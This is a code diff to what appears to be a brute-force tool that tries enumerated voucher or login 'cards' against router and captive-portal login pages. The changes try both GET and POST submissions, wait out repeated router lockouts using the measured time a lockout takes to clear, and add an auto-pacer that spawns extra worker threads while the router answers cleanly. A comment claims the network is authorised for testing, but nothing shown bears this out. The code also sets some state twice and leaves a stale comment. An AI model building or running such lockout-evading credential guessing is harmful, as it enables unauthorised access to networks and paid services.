@@ -362,60 +362,71 @@ def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,
         modes = [m for m in modes if not m.startswith("chap")]
     best = None
     trials = []
+    # some portals take the card from the query string, some only from a
+    # form body - and a page whose form is built by javascript often gets
+    # scanned as "get".  Try both before saying the card does not work.
+    methods = [m for m in ((p.get("method") or "post").lower(), "get", "post")
+               if m in ("get", "post")]
+    methods = list(dict.fromkeys(methods))
 
-    for dst in dsts:
-        for mode in modes:
-            trial = dict(p)
-            trial["pass_mode"] = mode
-            trial["dst_value"] = dst
-            judge = Judge(fp, p["login_url"])
-            try:
-                r = send_login(session, trial, known_card)
-            except Exception:                            # noqa: BLE001
-                continue
-            verdict = judge.classify(r, submitted_values(trial, known_card))
-            body = (r.text or "").lower()
-            trials.append({
-                "mode": mode, "dst": dst, "status": r.status,
-                "code": verdict.code, "reason": verdict.reason,
-                "location": r.location,
-                "word": (verdict.data or {}).get("word")
-                         or find_phrase(body, config.REJECT_WORDS)
-                         or find_phrase(body, config.BAN_WORDS)})
-            evidence = 0.0
-            if r.is_redirect():
-                host = (r.location.split("//")[-1].split("/")[0] or "").lower()
-                if host and host != (p["login_url"].split("//")[-1]
-                                     .split("/")[0].lower()):
-                    evidence = 0.9
-            if verdict.is_hit:
-                evidence = max(evidence, verdict.confidence)
-            if not evidence:
-                continue
-            ok, info = verify.verify_online(session, checks=checks)
-            if ok:
-                evidence = 1.0
-            words = _new_words(r.text or "", fp.reject_text)
-            candidate = {"mode": mode, "dst": dst, "evidence": evidence,
-                         "verified": ok, "internet": info.get("detail", ""),
-                         "location": r.location[:160], "words": words}
-            if best is None or candidate["evidence"] > best["evidence"]:
-                best = candidate
-            if evidence:
-                # a successful login puts this session "online": the next
-                # combination would then be judged against a logged-in router
-                # and look accepted for the wrong reason
-                verify.logout(session, p["login_url"])
-            if evidence >= 0.9:
+    for method in methods:
+        for dst in dsts:
+            for mode in modes:
+                trial = dict(p)
+                trial["pass_mode"] = mode
+                trial["dst_value"] = dst
+                trial["method"] = method
+                judge = Judge(fp, p["login_url"])
+                try:
+                    r = send_login(session, trial, known_card)
+                except Exception:                            # noqa: BLE001
+                    continue
+                verdict = judge.classify(r, submitted_values(trial, known_card))
+                body = (r.text or "").lower()
+                trials.append({
+                    "mode": mode, "method": method, "dst": dst, "status": r.status,
+                    "code": verdict.code, "reason": verdict.reason,
+                    "location": r.location,
+                    "word": (verdict.data or {}).get("word")
+                             or find_phrase(body, config.REJECT_WORDS)
+                             or find_phrase(body, config.BAN_WORDS)})
+                evidence = 0.0
+                if r.is_redirect():
+                    host = (r.location.split("//")[-1].split("/")[0] or "").lower()
+                    if host and host != (p["login_url"].split("//")[-1]
+                                         .split("/")[0].lower()):
+                        evidence = 0.9
+                if verdict.is_hit:
+                    evidence = max(evidence, verdict.confidence)
+                if not evidence:
+                    continue
+                ok, info = verify.verify_online(session, checks=checks)
+                if ok:
+                    evidence = 1.0
+                words = _new_words(r.text or "", fp.reject_text)
+                candidate = {"mode": mode, "method": method, "dst": dst,
+                             "evidence": evidence, "verified": ok,
+                             "internet": info.get("detail", ""),
+                             "location": r.location[:160], "words": words}
+                if best is None or candidate["evidence"] > best["evidence"]:
+                    best = candidate
+                if evidence:
+                    # a successful login puts this session "online": the next
+                    # combination would then be judged against a logged-in router
+                    # and look accepted for the wrong reason
+                    verify.logout(session, p["login_url"])
+                if evidence >= 0.9:
+                    break
+            if best and best["evidence"] >= 0.9:
                 break
-        if best and best["evidence"] >= 0.9:
-            break
 
     if not best:
         return p, [], None, trials
 
     p["pass_mode"] = best["mode"]
     p["dst_value"] = best["dst"]
+    if best.get("method"):
+        p["method"] = best["method"]
     tuned = {k: v for k, v in best.items() if k != "words"}
     return p, best["words"], tuned, trials
 
@@ -620,7 +631,7 @@ class Engine:
         self._watch_thread = None
         self._internet_opened = None   # set when the wall came down mid-run
         self._pause_until = 0.0     # "the router asked us to wait"
-        self._banned_once = False   # we wait a lockout out exactly once
+        self._banned_wait_count = 0  # how many lockouts we already sat out
         self._rate_count = 0
         self._unknown_saved = 0
         self._rejected_since_emit = 0
@@ -647,6 +658,12 @@ class Engine:
             progress = dict(self.progress)
             progress.setdefault("queued", processed)
             self.speed = processed / elapsed if elapsed > 0.05 else 0.0
+            # how long the rest of this run will take at the pace we are
+            # going - the one number a user waiting on a phone really wants
+            left = max(0, (progress.get("total") or 0) - processed)
+            progress["eta_seconds"] = (round(left / self.speed)
+                                       if self.speed > 0.05 else 0)
+            progress["threads"] = len((self._pool or {}).get("threads", []))
             lat = sorted(self.latencies)
             return {
                 "state": self.state,
@@ -728,11 +745,15 @@ class Engine:
                               "reason": "", "events": []})
         self._ban_count = self._rate_count = self._unknown_saved = 0
         self._pause_until = 0.0
-        self._banned_once = False
+        self._banned_wait_count = 0
         self._recent.clear()
         self._since_check = []
+        self._pace = {"t": time.time(), "n": 0, "ok": 0, "bad": 0}
+        self._pool = None
         self._internet_opened = None
         self._unevaluated = 0       # cards the router refused to judge
+        self._pace = {"t": time.time(), "n": 0, "ok": 0, "bad": 0}
+        self._pool = None           # growable worker pool (see _add_workers)
         self._clean_streak = 0
         space = store.space_size(p)
         pos = max(0, int(p.get("space_pos", 0)))
@@ -849,6 +870,10 @@ class Engine:
                        for i in range(threads)]
             for w in workers:
                 w.start()
+            # kept so the auto-pacer can add hands when this router is happy
+            self._pool = {"q": task_q, "stop": stop_holder,
+                          "worker": worker, "threads": list(workers),
+                          "started": int(threads)}
 
             sent = 0
             pos = start_pos
@@ -898,7 +923,7 @@ class Engine:
                     with self.lock:
                         self.progress["dropped"] = \
                             self.progress.get("dropped", 0) + dropped
-                for w in workers:
+                for w in list((self._pool or {"threads": workers})["threads"]):
                     w.join(timeout=5.0)
 
             # Remember how far we got, so the next run continues instead of
@@ -1026,6 +1051,7 @@ class Engine:
                 self._unevaluated += 1
         self._emit_attempt(card, resp, verdict, sent_index)
         self._maybe_decay_delay()
+        self._auto_pace(verdict.code)
         self._check_stop_rules()
 
     def _verify_hit(self, sess, verdict: Verdict, card: str) -> Verdict:
@@ -1161,6 +1187,7 @@ class Engine:
         self.emit("throttle", {"reason": note, "delay_ms": int(new)})
 
     def _maybe_decay_delay(self) -> None:
+        """Back to the pace the user asked for once the router calmed down."""
         base = self.throttle["base_ms"]
         with self.lock:
             current = self.throttle["delay_ms"]
@@ -1171,6 +1198,74 @@ class Engine:
             self.throttle["delay_ms"] = new
             self.throttle["reason"] = "recovering_speed" if new > base else ""
         self.emit("throttle", {"reason": "recovering_speed", "delay_ms": new})
+
+    # -- finding the fastest pace this router actually allows -------------
+    def _auto_pace(self, code: str) -> None:
+        """Additive increase / multiplicative decrease, the way TCP does it.
+
+        Every few seconds we look at what came back: if the router answered
+        cleanly we ask a little more of it (shorter delay, then extra hands);
+        the moment it answers with errors, rate-limit pages or block pages we
+        halve the rate.  The result is the best pace *this* router allows,
+        found while the run is going - and the page says what it is doing.
+        """
+        if not config.AUTO_PACE:
+            return
+        now = time.time()
+        with self.lock:
+            w = self._pace
+            w["n"] += 1
+            if code in ("REJECTED", "ACCEPTED", "ACCEPTED_VERIFIED",
+                        "ACCEPTED_UNVERIFIED"):
+                w["ok"] += 1
+            else:
+                w["bad"] += 1
+            if now - w["t"] < config.PACE_WINDOW_SECONDS or w["n"] < 8:
+                return
+            total, bad = w["n"], w["bad"]
+            delay, base = self.throttle["delay_ms"], self.throttle["base_ms"]
+            self._pace = {"t": now, "n": 0, "ok": 0, "bad": 0}
+        ratio = bad / max(total, 1)
+        if ratio > config.PACE_BAD_RATIO:
+            new = min(config.PACE_MAX_DELAY_MS, max(delay * 2, 120))
+            note = "auto_slowed_router_complaining"
+        elif ratio == 0 and delay <= base:
+            added = self._add_workers(2)
+            if not added:
+                return
+            note = "auto_sped_up_more_threads"
+            new = delay
+        elif ratio <= 0.01 and delay > base:
+            new = max(base, int(delay * 0.7))
+            note = "auto_sped_up"
+        else:
+            return
+        with self.lock:
+            self.throttle["delay_ms"] = int(new)
+            self.throttle["reason"] = note
+            self.throttle["events"].append({"t": round(now, 1), "reason": note,
+                                            "delay_ms": int(new)})
+            threads = len((self._pool or {}).get("threads", []))
+        self.emit("throttle", {"reason": note, "delay_ms": int(new),
+                               "threads": threads})
+
+    def _add_workers(self, count: int) -> int:
+        """Give the run more hands - only when the router is answering cleanly."""
+        pool = getattr(self, "_pool", None)
+        if not pool:
+            return 0
+        cap = min(config.PACE_MAX_THREADS, max(4, pool["started"] * 2))
+        added = 0
+        for _ in range(count):
+            with self.lock:
+                if len(pool["threads"]) >= cap:
+                    break
+                t = threading.Thread(target=pool["worker"], daemon=True,
+                                     name=f"kirapass-wx{len(pool['threads'])}")
+                pool["threads"].append(t)
+            t.start()
+            added += 1
+        return added
 
     # -- "did the wall come down?" -----------------------------------------
     def _start_watchdog(self) -> None:
@@ -1234,20 +1329,24 @@ class Engine:
         attempts = sum(counters.values())
         if errors >= config.BURST_LIMIT and errors >= attempts * 0.8:
             self.stop("target_unreachable")
-        if self._ban_count >= 3 and not self._banned_once:
+        if (self._ban_count >= 3 and
+                self._banned_wait_count < config.BLOCK_PATIENCE):
             # The router locked us out.  On a network we are allowed to test
             # the lockout is temporary, so we sit through it ONCE and then go
             # on slowly - hammering a router that is asking us to slow down
             # only makes the next lockout longer.
-            self._banned_once = True
+            self._banned_wait_count += 1
             self._ban_count = 0
-            self._pause_until = time.time() + config.BLOCK_WAIT_SECONDS
+            measured = int(self.profile.get("clears_after") or 0)
+            wait = (measured + 2) if measured else config.BLOCK_WAIT_SECONDS
+            self._pause_until = time.time() + wait
             with self.lock:
                 self.throttle["delay_ms"] = max(
                     self.throttle["delay_ms"], config.BAN_COOLDOWN_MS)
                 self.throttle["reason"] = "banned_waiting"
-            self.emit("block_wait", {"seconds": config.BLOCK_WAIT_SECONDS,
-                                     "cause": "router_lockout"})
+            self.emit("block_wait", {"seconds": wait,
+                                     "cause": "router_lockout",
+                                     "measured": measured})
             self.emit("throttle", {"reason": "banned_waiting",
                                    "delay_ms": self.throttle["delay_ms"]})
             return
@@ -1473,7 +1572,8 @@ def _summarise_trials(trials: list, limit: int = 6) -> list:
     """Keep what explains the failure: what we sent and what came back."""
     out = []
     for t in trials:
-        out.append({"mode": t.get("mode", ""), "dst": (t.get("dst") or "")[:48],
+        out.append({"mode": t.get("mode", ""), "method": t.get("method", ""),
+                    "dst": (t.get("dst") or "")[:48],
                     "status": t.get("status", 0), "code": t.get("code", ""),
                     "reason": t.get("reason", ""), "word": t.get("word", ""),
                     "location": (t.get("location") or "")[:60]})
